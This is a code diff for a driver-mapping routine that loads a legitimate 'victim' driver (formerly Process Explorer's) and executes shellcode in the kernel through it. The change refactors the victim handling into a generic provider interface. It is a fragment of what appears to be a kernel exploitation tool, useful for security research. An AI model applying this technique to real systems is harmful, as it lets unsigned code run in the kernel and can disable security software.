@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020 - 2021
+*  (C) COPYRIGHT AUTHORS, 2020 - 2022
 *
 *  TITLE:       DRVMAP.CPP
 *
-*  VERSION:     1.10
+*  VERSION:     1.20
 *
-*  DATE:        17 Apr 2021
+*  DATE:        10 Feb 2022
 *
 *  Driver mapping routines.
 *
@@ -481,7 +481,7 @@ BOOL KDUCheckMemoryLayout(
     //
     // If provider does not support translation return TRUE.
     //
-    if ((PVOID)prov->Callbacks.VirtualToPhysical == (PVOID)KDUProviderStub)
+    if ((PVOID)prov->Callbacks.VirtualToPhysical == NULL)
         return TRUE;
 
     dataSize = ScSizeOf(Context->ShellVersion, NULL);
@@ -531,6 +531,7 @@ BOOL KDUMapDriver(
     PVOID pvShellCode;
 
     KDU_PROVIDER* prov;
+    KDU_VICTIM_PROVIDER* victimProv;
 
     ULONG retryCount = 1, maxRetry = 3;
 
@@ -539,31 +540,34 @@ BOOL KDUMapDriver(
     FUNCTION_ENTER_MSG(__FUNCTION__);
 
     prov = Context->Provider;
+    victimProv = Context->Victim;
 
 Reload:
 
-    printf_s("[+] Victim driver map attempt %lu of %lu\r\n", retryCount, maxRetry);
+    if (victimProv->SupportReload == FALSE) {
+        printf_s("[+] Victim does not supports reload, max retry count set to 1\r\n");
+        maxRetry = 1;
+    }
+
+    printf_s("[+] Victim \"%ws\" %lu acquire attempt of %lu (max)\r\n", victimProv->Name, retryCount, maxRetry);
 
     //
     // If this is reload, release victim.
     //
     if (victimDeviceHandle) {
-        NtClose(victimDeviceHandle);
-        victimDeviceHandle = NULL;
-        VictimRelease((LPWSTR)PROCEXP152);
+        VpRelease(victimProv, &victimDeviceHandle);
     }
 
-    if (VictimCreate(Context->ModuleBase,
-        (LPWSTR)PROCEXP152,
-        IDR_PROCEXP,
+    if (VpCreate(victimProv,
+        Context->ModuleBase,
         &victimDeviceHandle))
     {
-        printf_s("[+] Victim driver loaded, handle 0x%p\r\n", victimDeviceHandle);
+        printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
     }
     else {
 
         supPrintfEvent(kduEventError, 
-            "[!] Could not load victim driver, GetLastError %lu\r\n", GetLastError());
+            "[!] Could not accept victim target, GetLastError %lu\r\n", GetLastError());
 
     }
 
@@ -620,7 +624,7 @@ Reload:
             }
 
             //
-            // ProcExp handle no longer needed, can be closed.
+            // Victim handle no longer needed, can be closed.
             //
             NtClose(victimDeviceHandle);
             victimDeviceHandle = NULL;
@@ -636,7 +640,7 @@ Reload:
                 if (retryCount > maxRetry) {
                     
                     supPrintfEvent(kduEventError, 
-                        "[!] Too many reloads, abort\r\n");
+                        "[!] Too many attempts, abort\r\n");
                     
                     break;
                 }
@@ -654,7 +658,7 @@ Reload:
     }
 
     //
-    // Ensure ProcExp handle is closed.
+    // Ensure victim handle is closed.
     //
     if (victimDeviceHandle) {
         NtClose(victimDeviceHandle);
@@ -692,10 +696,9 @@ Reload:
 
                     //
                     // Run shellcode.
-                    // Target has the same handlers for IRP_MJ_CREATE/CLOSE/DEVICE_CONTROL
                     //
                     printf_s("[+] Run shellcode\r\n");
-                    supOpenDriver((LPWSTR)PROCEXP152, GENERIC_READ | GENERIC_WRITE, &victimDeviceHandle);
+                    VpExecutePayload(victimProv, &victimDeviceHandle);
 
                     //
                     // Wait for the shellcode to trigger the event
@@ -750,11 +753,8 @@ Reload:
     //
     // Cleanup.
     //
-    if (victimDeviceHandle)
-        NtClose(victimDeviceHandle);
-
-    if (VictimRelease((LPWSTR)PROCEXP152)) {
-        printf_s("[+] Victim driver unloaded\r\n");
+    if (VpRelease(victimProv, &victimDeviceHandle)) {
+        printf_s("[+] Victim released\r\n");
     }
 
     FUNCTION_LEAVE_MSG(__FUNCTION__);
